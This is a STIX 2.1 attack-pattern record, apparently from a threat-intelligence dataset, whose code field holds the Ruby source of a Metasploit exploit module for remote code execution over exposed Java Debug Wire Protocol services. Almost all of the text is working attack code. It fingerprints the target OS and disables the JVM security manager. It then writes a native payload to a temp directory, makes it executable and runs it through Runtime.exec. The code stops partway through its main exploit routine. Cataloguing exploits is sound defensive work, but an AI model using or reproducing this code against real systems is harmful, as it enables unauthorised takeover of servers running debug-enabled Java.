{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4942f92-2d68-4703-9037-10b6df225a7f",
    "created": "2024-08-14T17:06:57.441278Z",
    "modified": "2024-08-14T17:06:57.441282Z",
    "name": "Java Debug Wire Protocol Remote Code Execution",
    "description": " This module abuses exposed Java Debug Wire Protocol services in order to execute arbitrary Java code remotely. It just abuses the protocol features, since no authentication is required if the service is enabled. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/java_jdwp_debugger.rb",
            "external_id": "java_jdwp_debugger.rb"
        },
        {
            "source_name": "reference",
            "url": "http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/nmap-dev/2010/q1/867"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/schierlm/JavaPayload/blob/master/JavaPayload/src/javapayload/builder/JDWPInjector.java"
        },
        {
            "source_name": "reference",
            "url": "https://svn.nmap.org/nmap/scripts/jdwp-exec.nse"
        },
        {
            "source_name": "reference",
            "url": "http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  HANDSHAKE                 = \"JDWP-Handshake\"\n\n  REQUEST_PACKET_TYPE       = 0x00\n  REPLY_PACKET_TYPE         = 0x80\n\n  # Command signatures\n  VERSION_SIG               = [1, 1]\n  CLASSESBYSIGNATURE_SIG    = [1, 2]\n  ALLCLASSES_SIG            = [1, 3]\n  ALLTHREADS_SIG            = [1, 4]\n  IDSIZES_SIG               = [1, 7]\n  CREATESTRING_SIG          = [1, 11]\n  SUSPENDVM_SIG             = [1, 8]\n  RESUMEVM_SIG              = [1, 9]\n  SIGNATURE_SIG             = [2, 1]\n  FIELDS_SIG                = [2, 4]\n  METHODS_SIG               = [2, 5]\n  GETVALUES_SIG             = [2, 6]\n  CLASSOBJECT_SIG           = [2, 11]\n  SETSTATICVALUES_SIG       = [3, 2]\n  INVOKESTATICMETHOD_SIG    = [3, 3]\n  CREATENEWINSTANCE_SIG     = [3, 4]\n  ARRAYNEWINSTANCE_SIG      = [4, 1]\n  REFERENCETYPE_SIG         = [9, 1]\n  INVOKEMETHOD_SIG          = [9, 6]\n  STRINGVALUE_SIG           = [10, 1]\n  THREADNAME_SIG            = [11, 1]\n  THREADSUSPEND_SIG         = [11, 2]\n  THREADRESUME_SIG          = [11, 3]\n  THREADSTATUS_SIG          = [11, 4]\n  ARRAYSETVALUES_SIG        = [13, 3]\n  EVENTSET_SIG              = [15, 1]\n  EVENTCLEAR_SIG            = [15, 2]\n  EVENTCLEARALL_SIG         = [15, 3]\n\n  # Other codes\n  MODKIND_COUNT             = 1\n  MODKIND_THREADONLY        = 2\n  MODKIND_CLASSMATCH        = 5\n  MODKIND_LOCATIONONLY      = 7\n  MODKIND_STEP              = 10\n  EVENT_BREAKPOINT          = 2\n  EVENT_STEP                = 1\n  SUSPEND_EVENTTHREAD       = 1\n  SUSPEND_ALL               = 2\n  NOT_IMPLEMENTED           = 99\n  VM_DEAD                   = 112\n  INVOKE_SINGLE_THREADED    = 2\n  TAG_OBJECT                = 76\n  TAG_STRING                = 115\n  TYPE_CLASS                = 1\n  TAG_ARRAY                 = 91\n  TAG_VOID                  = 86\n  TAG_THREAD                = 116\n  STEP_INTO                 = 0\n  STEP_MIN                  = 0\n  THREAD_SLEEPING_STATUS     = 2\n\n  def initialize\n    super(\n      'Name'           => 'Java Debug Wire Protocol Remote Code Execution',\n      'Description'    => %q{\n        This module abuses exposed Java Debug Wire Protocol services in order\n        to execute arbitrary Java code remotely. It just abuses the protocol\n        features, since no authentication is required if the service is enabled.\n      },\n      'Author'         => [\n        'Michael Schierl', # Vulnerability discovery / First exploit seen / Msf module help\n        'Christophe Alladoum', # JDWP Analysis and Exploit\n        'Redsadic <julian.vilas[at]gmail.com>' # Metasploit Module\n      ],\n      'References'     =>\n        [\n          ['OSVDB', '96066'],\n          ['EDB', '27179'],\n          ['URL', 'http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html'],\n          ['URL', 'https://seclists.org/nmap-dev/2010/q1/867'],\n          ['URL', 'https://github.com/schierlm/JavaPayload/blob/master/JavaPayload/src/javapayload/builder/JDWPInjector.java'],\n          ['URL', 'https://svn.nmap.org/nmap/scripts/jdwp-exec.nse'],\n          ['URL', 'http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html']\n        ],\n      'Platform'       => %w{ linux osx win },\n      'Arch'           => [ARCH_ARMLE, ARCH_AARCH64, ARCH_X86, ARCH_X64],\n      'Payload'        =>\n        {\n          'Space'        => 10000000,\n          'BadChars'    => '',\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'Linux (Native Payload)', { 'Platform' => 'linux' } ],\n          [ 'OSX (Native Payload)', { 'Platform' => 'osx' } ],\n          [ 'Windows (Native Payload)', { 'Platform' => 'win' } ]\n        ],\n      'DefaultTarget'  => 0,\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => 'Mar 12 2010'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10]),\n        OptString.new('TMP_PATH', [ false, 'A directory where we can write files. Ensure there is a trailing slash']),\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('NUM_RETRIES', [true, 'Number of retries when waiting for event', 10]),\n      ])\n  end\n\n  def check\n    connect\n    res = handshake\n    disconnect\n\n    if res.nil?\n      return Exploit::CheckCode::Unknown\n    elsif res == HANDSHAKE\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  def default_timeout\n    datastore['RESPONSE_TIMEOUT']\n  end\n\n  # Establishes handshake with the server\n  def handshake\n    sock.put(HANDSHAKE)\n    return sock.get_once(-1, datastore['RESPONSE_TIMEOUT'])\n  end\n\n  # Forges packet for JDWP protocol\n  def create_packet(cmdsig, data=\"\")\n    flags = 0x00\n    cmdset, cmd = cmdsig\n    pktlen = data.length + 11\n    buf = [pktlen, @my_id, flags, cmdset, cmd]\n    pkt = buf.pack(\"NNCCC\")\n    pkt << data\n    @my_id += 2\n    pkt\n  end\n\n  # Reads packet response for JDWP protocol\n  def read_reply(timeout = default_timeout)\n    length = sock.get_once(4, timeout)\n    fail_with(Failure::TimeoutExpired, \"#{peer} - Not received response length\") unless length\n    pkt_len = length.unpack('N')[0]\n    if pkt_len < 4\n      fail_with(Failure::Unknown, \"#{peer} - Received corrupted response\")\n    end\n    id, flags, err_code = sock.get_once(7, timeout).unpack('NCn')\n    if err_code != 0 && flags == REPLY_PACKET_TYPE\n      fail_with(Failure::Unknown, \"#{peer} - Server sent error with code #{err_code}\")\n    end\n\n    response = \"\"\n    while response.length + 11 < pkt_len\n      partial = sock.get_once(pkt_len, timeout)\n      fail_with(Failure::TimeoutExpired, \"#{peer} - Not received response\") unless partial\n      response << partial\n    end\n    fail_with(Failure::Unknown, \"#{peer} - Received corrupted response\") unless response.length + 11 == pkt_len\n    response\n  end\n\n  # Returns the characters contained in the string defined in target VM\n  def solve_string(data)\n    sock.put(create_packet(STRINGVALUE_SIG, data))\n    response = read_reply\n    return \"\" unless response\n    return read_string(response)\n  end\n\n  # Unpacks received string structure from the server response into a normal string\n  def read_string(data)\n    data_len = data.unpack('N')[0]\n    return data[4,data_len]\n  end\n\n  # Creates a new string object in the target VM and returns its id\n  def create_string(data)\n    buf = build_string(data)\n    sock.put(create_packet(CREATESTRING_SIG, buf))\n    buf = read_reply\n    return parse_entries(buf, [[@vars['objectid_size'], \"obj_id\"]], false)\n  end\n\n  # Packs normal string into string structure for target VM\n  def build_string(data)\n    ret = [data.length].pack('N')\n    ret << data\n\n    ret\n  end\n\n  # Pack Integer for JDWP protocol\n  def format(fmt, value)\n    if fmt == \"L\" || fmt == 8\n      return [value].pack('Q>')\n    elsif fmt == \"I\" || fmt == 4\n      return [value].pack('N')\n    end\n\n    fail_with(Failure::Unknown, \"Unknown format\")\n  end\n\n  # Unpack Integer from JDWP protocol\n  def unformat(fmt, value)\n    if fmt == \"L\" || fmt == 8\n      return value[0..7].unpack('Q>')[0]\n    elsif fmt == \"I\" || fmt == 4\n      return value[0..3].unpack('N')[0]\n    end\n\n    fail_with(Failure::Unknown, \"Unknown format\")\n  end\n\n  # Parses given data according to a set of formats\n  def parse_entries(buf, formats, explicit=true)\n    entries = []\n    index = 0\n\n    if explicit\n      nb_entries = buf.unpack('N')[0]\n      buf = buf[4..-1]\n    else\n      nb_entries = 1\n    end\n\n    nb_entries.times do |var|\n\n      if var != 0 && var % 1000 == 0\n        vprint_status(\"Parsed #{var} classes of #{nb_entries}\")\n      end\n\n      data = {}\n\n      formats.each do |fmt,name|\n        if fmt == \"L\" || fmt == 8\n          data[name] = buf[index, 8].unpack('Q>')[0]\n          index += 8\n        elsif fmt == \"I\" || fmt == 4\n          data[name] = buf[index, 4].unpack('N')[0]\n          index += 4\n        elsif fmt == \"S\"\n          data_len = buf[index, 4].unpack('N')[0]\n          data[name] = buf[index + 4, data_len]\n          index += 4 + data_len\n        elsif fmt == \"C\"\n          data[name] = buf[index].unpack('C')[0]\n          index += 1\n        elsif fmt == \"Z\"\n          t = buf[index].unpack('C')[0]\n          if t == 115\n            data[name] = solve_string(buf[index + 1, 8])\n            index += 9\n          elsif t == 73\n            data[name], buf = buf[index +1, 4].unpack('NN')\n          end\n        else\n          fail_with(Failure::UnexpectedReply, \"Unexpected data when parsing server response\")\n        end\n\n      end\n      entries.append(data)\n    end\n\n    entries\n  end\n\n  # Gets the sizes of variably-sized data types in the target VM\n  def get_sizes\n    formats = [\n        [\"I\", \"fieldid_size\"],\n        [\"I\", \"methodid_size\"],\n        [\"I\", \"objectid_size\"],\n        [\"I\", \"referencetypeid_size\"],\n        [\"I\", \"frameid_size\"]\n    ]\n    sock.put(create_packet(IDSIZES_SIG))\n    response = read_reply\n    entries = parse_entries(response, formats, false)\n    entries.each { |e| @vars.merge!(e) }\n  end\n\n  # Gets the JDWP version implemented by the target VM\n  def get_version\n    formats = [\n        [\"S\", \"descr\"],\n        [\"I\", \"jdwp_major\"],\n        [\"I\", \"jdwp_minor\"],\n        [\"S\", \"vm_version\"],\n        [\"S\", \"vm_name\"]\n    ]\n    sock.put(create_packet(VERSION_SIG))\n    response = read_reply\n    entries = parse_entries(response, formats, false)\n    entries.each { |e| @vars.merge!(e) }\n  end\n\n  def version\n    \"#{@vars[\"vm_name\"]} - #{@vars[\"vm_version\"]}\"\n  end\n\n  # Returns reference for all threads currently running on target VM\n  def get_all_threads\n    sock.put(create_packet(ALLTHREADS_SIG))\n    response = read_reply\n    num_threads = response.unpack('N').first\n    index = 4\n\n    size = @vars[\"objectid_size\"]\n    num_threads.times do\n      t_id = unformat(size, response[index, size])\n      @threads[t_id] = nil\n      index += size\n    end\n  end\n\n  # Returns reference types for all classes currently loaded by the target VM\n  def get_all_classes\n    return unless @classes.empty?\n\n    formats = [\n      [\"C\", \"reftype_tag\"],\n      [@vars[\"referencetypeid_size\"], \"reftype_id\"],\n      [\"S\", \"signature\"],\n      [\"I\", \"status\"]\n    ]\n    sock.put(create_packet(ALLCLASSES_SIG))\n    response = read_reply\n    @classes.append(parse_entries(response, formats))\n  end\n\n  # Checks if specified class is currently loaded by the target VM and returns it\n  def get_class_by_name(name)\n    @classes.each do |entry_array|\n      entry_array.each do |entry|\n        if entry[\"signature\"].downcase == name.downcase\n          return entry\n        end\n      end\n    end\n\n    nil\n  end\n\n  # Returns information for each method in a reference type (ie. object). Inherited methods are not included.\n  # The list of methods will include constructors (identified with the name \"<init>\")\n  def get_methods(reftype_id)\n    if @methods.has_key?(reftype_id)\n      return @methods[reftype_id]\n    end\n\n    formats = [\n        [@vars[\"methodid_size\"], \"method_id\"],\n        [\"S\", \"name\"],\n        [\"S\", \"signature\"],\n        [\"I\", \"mod_bits\"]\n    ]\n    ref_id = format(@vars[\"referencetypeid_size\"],reftype_id)\n    sock.put(create_packet(METHODS_SIG, ref_id))\n    response = read_reply\n    @methods[reftype_id] = parse_entries(response, formats)\n  end\n\n  # Returns information for each field in a reference type (ie. object)\n  def get_fields(reftype_id)\n    formats = [\n            [@vars[\"fieldid_size\"], \"field_id\"],\n            [\"S\", \"name\"],\n            [\"S\", \"signature\"],\n            [\"I\", \"mod_bits\"]\n    ]\n    ref_id = format(@vars[\"referencetypeid_size\"],reftype_id)\n    sock.put(create_packet(FIELDS_SIG, ref_id))\n    response = read_reply\n    fields = parse_entries(response, formats)\n\n    fields\n  end\n\n  # Returns the value of one static field of the reference type. The field must be member of the reference type\n  # or one of its superclasses, superinterfaces, or implemented interfaces. Access control is not enforced;\n  # for example, the values of private fields can be obtained.\n  def get_value(reftype_id, field_id)\n    data = format(@vars[\"referencetypeid_size\"],reftype_id)\n    data << [1].pack('N')\n    data << format(@vars[\"fieldid_size\"],field_id)\n\n    sock.put(create_packet(GETVALUES_SIG, data))\n    response = read_reply\n    num_values = response.unpack('N')[0]\n\n    unless (num_values == 1) && (response[4].unpack('C')[0] == TAG_OBJECT)\n      fail_with(Failure::Unknown, \"Bad response when getting value for field\")\n    end\n\n    len = @vars[\"objectid_size\"]\n    value = unformat(len, response[5..-1])\n\n    value\n  end\n\n  # Sets the value of one static field. Each field must be member of the class type or one of its superclasses,\n  # superinterfaces, or implemented interfaces. Access control is not enforced; for example, the values of\n  # private fields can be set. Final fields cannot be set.For primitive values, the value's type must match\n  # the field's type exactly. For object values, there must exist a widening reference conversion from the\n  # value's type to the field's type and the field's type must be loaded.\n  def set_value(reftype_id, field_id, value)\n    data = format(@vars[\"referencetypeid_size\"],reftype_id)\n    data << [1].pack('N')\n    data << format(@vars[\"fieldid_size\"],field_id)\n    data << format(@vars[\"objectid_size\"],value)\n\n    sock.put(create_packet(SETSTATICVALUES_SIG, data))\n    read_reply\n  end\n\n\n  # Checks if specified method is currently loaded by the target VM and returns it\n  def get_method_by_name(classname, name, signature = nil)\n    @methods[classname].each do |entry|\n        if signature.nil?\n          return entry if entry[\"name\"].downcase == name.downcase\n        else\n          if entry[\"name\"].downcase == name.downcase && entry[\"signature\"].downcase == signature.downcase\n            return entry\n          end\n        end\n    end\n\n    nil\n  end\n\n  # Checks if specified class and method are currently loaded by the target VM and returns them\n  def get_class_and_method(looked_class, looked_method, signature = nil)\n    target_class = get_class_by_name(looked_class)\n    unless target_class\n      fail_with(Failure::Unknown, \"Class \\\"#{looked_class}\\\" not found\")\n    end\n\n    get_methods(target_class[\"reftype_id\"])\n    target_method = get_method_by_name(target_class[\"reftype_id\"], looked_method, signature)\n    unless target_method\n      fail_with(Failure::Unknown, \"Method \\\"#{looked_method}\\\" not found\")\n    end\n\n    return target_class, target_method\n  end\n\n  # Transform string contaning class and method(ie. from \"java.net.ServerSocket.accept\" to \"Ljava/net/Serversocket;\" and \"accept\")\n  def str_to_fq_class(s)\n    i = s.rindex(\".\")\n    unless i\n      fail_with(Failure::BadConfig, 'Bad defined break class')\n    end\n\n    method = s[i+1..-1] # Subtr of s, from last '.' to the end of the string\n\n    classname = 'L'\n    classname << s[0..i-1].gsub(/[.]/, '/')\n    classname << ';'\n\n    return classname, method\n  end\n\n  # Gets the status of a given thread\n  def thread_status(thread_id)\n    sock.put(create_packet(THREADSTATUS_SIG, format(@vars[\"objectid_size\"], thread_id)))\n    buf = read_reply(datastore['BREAK_TIMEOUT'])\n    unless buf\n      fail_with(Failure::Unknown, \"No network response\")\n    end\n    status, suspend_status = buf.unpack('NN')\n\n    status\n  end\n\n  # Resumes execution of the application or thread after the suspend command or an event has stopped it\n  def resume_vm(thread_id = nil)\n    if thread_id.nil?\n      sock.put(create_packet(RESUMEVM_SIG))\n    else\n      sock.put(create_packet(THREADRESUME_SIG, format(@vars[\"objectid_size\"], thread_id)))\n    end\n\n    response = read_reply(datastore['BREAK_TIMEOUT'])\n    unless response\n      fail_with(Failure::Unknown, \"No network response\")\n    end\n\n    response\n  end\n\n  # Suspend execution of the application or thread\n  def suspend_vm(thread_id = nil)\n    if thread_id.nil?\n      sock.put(create_packet(SUSPENDVM_SIG))\n    else\n      sock.put(create_packet(THREADSUSPEND_SIG, format(@vars[\"objectid_size\"], thread_id)))\n    end\n\n    response = read_reply\n    unless response\n      fail_with(Failure::Unknown, \"No network response\")\n    end\n\n    response\n  end\n\n  # Sets an event request. When the event described by this request occurs, an event is sent from the target VM\n  def send_event(event_code, args)\n    data = [event_code].pack('C')\n    data << [SUSPEND_ALL].pack('C')\n    data << [args.length].pack('N')\n\n    args.each do |kind,option|\n      data << [kind].pack('C')\n      data << option\n    end\n\n    sock.put(create_packet(EVENTSET_SIG, data))\n    response = read_reply\n    unless response\n      fail_with(Failure::Unknown, \"#{peer} - No network response\")\n    end\n    return response.unpack('N')[0]\n  end\n\n  # Parses a received event and compares it with the expected\n  def parse_event(buf, event_id, thread_id)\n    len = @vars[\"objectid_size\"]\n    return false if buf.length < 10 + len - 1\n\n    r_id = buf[6..9].unpack('N')[0]\n    t_id = unformat(len,buf[10..10+len-1])\n\n    return (event_id == r_id) && (thread_id == t_id)\n  end\n\n  # Clear a defined event request\n  def clear_event(event_code, r_id)\n    data = [event_code].pack('C')\n    data << [r_id].pack('N')\n    sock.put(create_packet(EVENTCLEAR_SIG, data))\n    read_reply\n  end\n\n  # Invokes a static method. The method must be member of the class type or one of its superclasses,\n  # superinterfaces, or implemented interfaces. Access control is not enforced; for example, private\n  # methods can be invoked.\n  def invoke_static(class_id, thread_id, meth_id, args = [])\n    data = format(@vars[\"referencetypeid_size\"], class_id)\n    data << format(@vars[\"objectid_size\"], thread_id)\n    data << format(@vars[\"methodid_size\"], meth_id)\n    data << [args.length].pack('N')\n\n    args.each do |arg|\n      data << arg\n      data << [0].pack('N')\n    end\n\n    sock.put(create_packet(INVOKESTATICMETHOD_SIG, data))\n    buf = read_reply\n    buf\n  end\n\n  # Invokes a instance method. The method must be member of the object's type or one of its superclasses,\n  # superinterfaces, or implemented interfaces. Access control is not enforced; for example, private methods\n  # can be invoked.\n  def invoke(obj_id, thread_id, class_id, meth_id, args = [])\n    data = format(@vars[\"objectid_size\"], obj_id)\n    data << format(@vars[\"objectid_size\"], thread_id)\n    data << format(@vars[\"referencetypeid_size\"], class_id)\n    data << format(@vars[\"methodid_size\"], meth_id)\n    data << [args.length].pack('N')\n\n    args.each do |arg|\n      data << arg\n      data << [0].pack('N')\n    end\n\n    sock.put(create_packet(INVOKEMETHOD_SIG, data))\n    buf = read_reply\n    buf\n  end\n\n  # Creates a new object of specified class, invoking the specified constructor. The constructor\n  # method ID must be a member of the class type.\n  def create_instance(class_id, thread_id, meth_id, args = [])\n    data = format(@vars[\"referencetypeid_size\"], class_id)\n    data << format(@vars[\"objectid_size\"], thread_id)\n    data << format(@vars[\"methodid_size\"], meth_id)\n    data << [args.length].pack('N')\n\n    args.each do |arg|\n      data << arg\n      data << [0].pack('N')\n    end\n\n    sock.put(create_packet(CREATENEWINSTANCE_SIG, data))\n    buf = read_reply\n    buf\n  end\n\n  # Creates a byte[]\n  def create_array(len)\n    target_class = get_class_by_name(\"[B\")\n    fail_with(Failure::Unknown, \"target_class is nil\") if target_class.nil?\n\n    type_id = target_class[\"reftype_id\"]\n    fail_with(Failure::Unknown, \"type_id is nil\") if type_id.nil?\n\n    data = format(@vars[\"referencetypeid_size\"], type_id)\n    data << [len].pack('N')\n\n    sock.put(create_packet(ARRAYNEWINSTANCE_SIG, data))\n    buf = read_reply\n    buf\n  end\n\n  # Initializes the byte[] with values\n  def set_values(obj_id, args = [])\n    data = format(@vars[\"objectid_size\"], obj_id)\n    data << [0].pack('N')\n    data << [args.length].pack('N')\n\n    args.each do |arg|\n      data << [arg].pack('C')\n    end\n\n    sock.put(create_packet(ARRAYSETVALUES_SIG, data))\n    read_reply\n  end\n\n  def temp_path\n    return nil unless datastore['TMP_PATH']\n    unless datastore['TMP_PATH'].end_with?('/') || datastore['TMP_PATH'].end_with?('\\\\')\n      fail_with(Failure::BadConfig, 'You need to add a trailing slash/backslash to TMP_PATH')\n    end\n    datastore['TMP_PATH']\n  end\n\n  # Configures payload according to targeted architecture\n  def setup_payload\n    # 1. Setting up generic values.\n    payload_exe = rand_text_alphanumeric(4 + rand(4))\n    pl_exe = generate_payload_exe\n\n    # 2. Setting up arch specific...\n    case target['Platform']\n    when 'linux'\n      path = temp_path || '/tmp/'\n      payload_exe = \"#{path}#{payload_exe}\"\n    when 'osx'\n      path = temp_path || '/private/tmp/'\n      payload_exe = \"#{path}#{payload_exe}\"\n    when 'win'\n      path = temp_path || './'\n      payload_exe = \"#{path}#{payload_exe}.exe\"\n    end\n\n    if @os.downcase =~ /target['Platform']/\n      print_warning(\"#{@os} system detected but using #{target['Platform']} target...\")\n    end\n\n    return payload_exe, pl_exe\n  end\n\n  # Invokes java.lang.System.getProperty() for OS fingerprinting purposes\n  def fingerprint_os(thread_id)\n    size = @vars[\"objectid_size\"]\n\n    # 1. Creates a string on target VM with the property to be getted\n    cmd_obj_ids = create_string(\"os.name\")\n    fail_with(Failure::Unknown, \"Failed to allocate string for payload dumping\") if cmd_obj_ids.length == 0\n    cmd_obj_id = cmd_obj_ids[0][\"obj_id\"]\n\n    # 2. Gets property\n    data = [TAG_OBJECT].pack('C')\n    data << format(size, cmd_obj_id)\n    data_array = [data]\n    runtime_class , runtime_meth = get_class_and_method(\"Ljava/lang/System;\", \"getProperty\")\n    buf = invoke_static(runtime_class[\"reftype_id\"], thread_id, runtime_meth[\"method_id\"], data_array)\n    fail_with(Failure::UnexpectedReply, \"Unexpected returned type: expected String\") unless buf[0] == [TAG_STRING].pack('C')\n\n    str = unformat(size, buf[1..1+size-1])\n    @os = solve_string(format(@vars[\"objectid_size\"],str))\n  end\n\n  # Creates a file on the server given a execution thread\n  def create_file(thread_id, filename)\n    cmd_obj_ids = create_string(filename)\n    fail_with(Failure::Unknown, \"Failed to allocate string for filename\") if cmd_obj_ids.length == 0\n\n    cmd_obj_id = cmd_obj_ids[0][\"obj_id\"]\n    size = @vars[\"objectid_size\"]\n    data = [TAG_OBJECT].pack('C')\n    data << format(size, cmd_obj_id)\n    data_array = [data]\n    runtime_class , runtime_meth = get_class_and_method(\"Ljava/io/FileOutputStream;\", \"<init>\", \"(Ljava/lang/String;)V\")\n    buf = create_instance(runtime_class[\"reftype_id\"], thread_id, runtime_meth[\"method_id\"], data_array)\n    fail_with(Failure::UnexpectedReply, \"Unexpected returned type: expected Object\") unless buf[0] == [TAG_OBJECT].pack('C')\n\n    file = unformat(size, buf[1..1+size-1])\n    fail_with(Failure::Unknown, \"Failed to create file. Try to change the TMP_PATH\") if file.nil? || (file == 0)\n\n    register_files_for_cleanup(filename)\n\n    file\n  end\n\n  # Stores the payload on a new string created in target VM\n  def upload_payload(thread_id, pl_exe)\n    size = @vars[\"objectid_size\"]\n\n    buf = create_array(pl_exe.length)\n    fail_with(Failure::UnexpectedReply, \"Unexpected returned type: expected Array\") unless buf[0] == [TAG_ARRAY].pack('C')\n\n    pl = unformat(size, buf[1..1+size-1])\n    fail_with(Failure::Unknown, \"Failed to create byte array to store payload\") if pl.nil? || (pl == 0)\n\n    set_values(pl, pl_exe.bytes)\n    pl\n  end\n\n  # Dumps the payload on a opened server file given a execution thread\n  def dump_payload(thread_id, file, pl)\n    size = @vars[\"objectid_size\"]\n    data = [TAG_OBJECT].pack('C')\n    data << format(size, pl)\n    data_array = [data]\n    runtime_class , runtime_meth = get_class_and_method(\"Ljava/io/FileOutputStream;\", \"write\", \"([B)V\")\n    buf = invoke(file, thread_id, runtime_class[\"reftype_id\"], runtime_meth[\"method_id\"], data_array)\n    unless buf[0] == [TAG_VOID].pack('C')\n      fail_with(Failure::Unknown, \"Exception while writing to file\")\n    end\n  end\n\n  # Closes a file on the server given a execution thread\n  def close_file(thread_id, file)\n    runtime_class , runtime_meth = get_class_and_method(\"Ljava/io/FileOutputStream;\", \"close\")\n    buf = invoke(file, thread_id, runtime_class[\"reftype_id\"], runtime_meth[\"method_id\"])\n    unless buf[0] == [TAG_VOID].pack('C')\n      fail_with(Failure::Unknown, \"Exception while closing file\")\n    end\n  end\n\n  # Executes a system command on target VM making use of java.lang.Runtime.exec()\n  def execute_command(thread_id, cmd)\n    size = @vars[\"objectid_size\"]\n\n    # 1. Creates a string on target VM with the command to be executed\n    cmd_obj_ids = create_string(cmd)\n    if cmd_obj_ids.length == 0\n      fail_with(Failure::Unknown, \"Failed to allocate string for payload dumping\")\n    end\n\n    cmd_obj_id = cmd_obj_ids[0][\"obj_id\"]\n\n    # 2. Gets Runtime context\n    runtime_class , runtime_meth = get_class_and_method(\"Ljava/lang/Runtime;\", \"getRuntime\")\n    buf = invoke_static(runtime_class[\"reftype_id\"], thread_id, runtime_meth[\"method_id\"])\n    unless buf[0] == [TAG_OBJECT].pack('C')\n      fail_with(Failure::UnexpectedReply, \"Unexpected returned type: expected Object\")\n    end\n\n    rt = unformat(size, buf[1..1+size-1])\n    if rt.nil? || (rt == 0)\n      fail_with(Failure::Unknown, \"Failed to invoke Runtime.getRuntime()\")\n    end\n\n    # 3. Finds and executes \"exec\" method supplying the string with the command\n    exec_meth = get_method_by_name(runtime_class[\"reftype_id\"], \"exec\")\n    if exec_meth.nil?\n      fail_with(Failure::BadConfig, \"Cannot find method Runtime.exec()\")\n    end\n\n    data = [TAG_OBJECT].pack('C')\n    data << format(size, cmd_obj_id)\n    data_array = [data]\n    buf = invoke(rt, thread_id, runtime_class[\"reftype_id\"], exec_meth[\"method_id\"], data_array)\n    unless buf[0] == [TAG_OBJECT].pack('C')\n      fail_with(Failure::UnexpectedReply, \"Unexpected returned type: expected Object\")\n    end\n  end\n\n  # Set event for stepping into a running thread\n  def set_step_event\n    # 1. Select a thread in sleeping status\n    t_id = nil\n    @threads.each_key do |thread|\n      if thread_status(thread) == THREAD_SLEEPING_STATUS\n        t_id = thread\n        break\n      end\n    end\n    fail_with(Failure::Unknown, \"Could not find a suitable thread for stepping\") if t_id.nil?\n\n    # 2. Suspend the VM before setting the event\n    suspend_vm\n\n    vprint_status(\"Setting 'step into' event in thread: #{t_id}\")\n    step_info = format(@vars[\"objectid_size\"], t_id)\n    step_info << [STEP_MIN].pack('N')\n    step_info << [STEP_INTO].pack('N')\n    data = [[MODKIND_STEP, step_info]]\n\n    r_id = send_event(EVENT_STEP, data)\n    unless r_id\n      fail_with(Failure::Unknown, \"Could not set the event\")\n    end\n\n    return r_id, t_id\n  end\n\n  # Disables security manager if it's set on target JVM\n  def disable_sec_manager\n    sys_class = get_class_by_name(\"Ljava/lang/System;\")\n\n    fields = get_fields(sys_class[\"reftype_id\"])\n\n    sec_field = nil\n\n    fields.each do |field|\n      sec_field = field[\"field_id\"] if field[\"name\"].downcase == \"security\"\n    end\n\n    fail_with(Failure::Unknown, \"Security attribute not found\") if sec_field.nil?\n\n    value = get_value(sys_class[\"reftype_id\"], sec_field)\n\n    if(value == 0)\n      print_good(\"Security manager was not set\")\n    else\n      set_value(sys_class[\"reftype_id\"], sec_field, 0)\n      if get_value(sys_class[\"reftype_id\"], sec_field) == 0\n        print_good(\"Security manager has been disabled\")\n      else\n        print_good(\"Security manager has not been disabled, trying anyway...\")\n      end\n    end\n  end\n\n  # Uploads & executes the payload on the target VM\n  def exec_payload(thread_id)\n    # 0. Fingerprinting OS\n    fingerprint_os(thread_id)\n\n    vprint_status(\"Executing payload on \\\"#{@os}\\\", target version: #{version}\")\n\n    # 1. Prepares the payload\n    payload_exe, pl_exe = setup_payload\n\n    # 2. Creates file on server for dumping payload\n    file = create_file(thread_id, payload_exe)\n\n    # 3. Uploads payload to the server\n    pl = upload_payload(thread_id, pl_exe)\n\n    # 4. Dumps uploaded payload into file on the server\n    dump_payload(thread_id, file, pl)\n\n    # 5. Closes the file on the server\n    close_file(thread_id, file)\n\n    # 5b. When linux arch, give execution permissions to file\n    if target['Platform'] == 'linux' || target['Platform'] == 'osx'\n      cmd = \"chmod +x #{payload_exe}\"\n      execute_command(thread_id, cmd)\n    end\n\n    # 6. Executes the dumped payload\n    cmd = \"#{payload_exe}\"\n    execute_command(thread_id, cmd)\n  end\n\n\n  def exploit\n    @my_id = 0x01\n    @vars = {}\n    @classes = []\n    @methods = {}\n    @threads = {}\n    @os = nil\n\n    connect\n\n    unless handshake == HANDSHAKE\n      fail_with(Failure::NotVulnerable, \"JDWP Protocol not found\")\n    end\n\n    print_status(\"Retrieving the sizes of variable sized data types in the target VM...\")\n    get_sizes\n\n    print_status(\"Getting the version of the target VM...\")\n    get_version\n\n    print_status(\"Getting all currently loaded classes by the target VM...\")\n    get_all_classes\n\n    print_status(\"Getting all running threads in the target VM...\")\n    get_all_threads\n\n    print_status(\"Setting 'step into' event...\")\n    r_id, t_id = set_step_event\n\n    print_status(\"Resuming VM and waiting for an event...\")\n    response = resume_vm\n\n    unless parse_event(response, r_id, t_id)\n      datastore['NUM_RETRIES'].times do |i|\n        print_status(\"Received #{i + 1} responses that are not a 'step into' event...\")\n        buf = read_reply\n        break if parse_event(buf, r_id, t_id)\n\n        if i == datastore['NUM_RETRIES']\n          fail_with(Failure::Unknown, \"Event not received in #{datastore['NUM_RETRIES']} attempts\")\n        end\n      end\n    end\n\n    vprint_status(\"Received matching event from thread #{t_id}\")\n    